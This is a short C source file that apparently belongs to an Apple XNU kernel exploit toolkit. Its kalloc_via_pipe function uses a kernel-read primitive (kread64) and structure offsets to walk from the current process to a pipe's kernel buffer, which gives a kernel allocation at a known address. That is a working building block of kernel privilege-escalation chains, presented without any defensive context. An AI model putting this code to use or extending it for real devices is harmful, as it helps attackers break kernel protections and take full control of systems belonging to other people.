#include "kalloc_pipe.h"
#include "kutils.h"
#include "offsets.h"
#include "krw.h"
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

pipe_info_t *kalloc_via_pipe(size_t size) {
    pipe_info_t *info = calloc(1, sizeof(pipe_info_t));
    info->user_buffer = calloc(1, size);
    info->size = size;
    pipe(info->fd);

    write(info->fd[1], info->user_buffer, size);
    read(info->fd[0], info->user_buffer, size);

    uint64_t ourproc = proc_of_pid(getpid());
    uint64_t filedesc = kread64(ourproc + off_p_pfd);
    uint64_t ofiles = kread64(filedesc);
    uint64_t fileproc = kread64(ofiles + info->fd[0] * 8);
    uint64_t fileglob = kread64(fileproc + off_fp_fglob);
    uint64_t data = kread64(fileglob + off_fg_data);
    // khexdump(data, 0x20);
    info->kern_buffer = kread64(data + off_pb_buffer);
    return info;
}

void kfree_via_pipe(pipe_info_t *info) {
    close(info->fd[0]);
    close(info->fd[1]);
    free(info->user_buffer);
    free(info);
}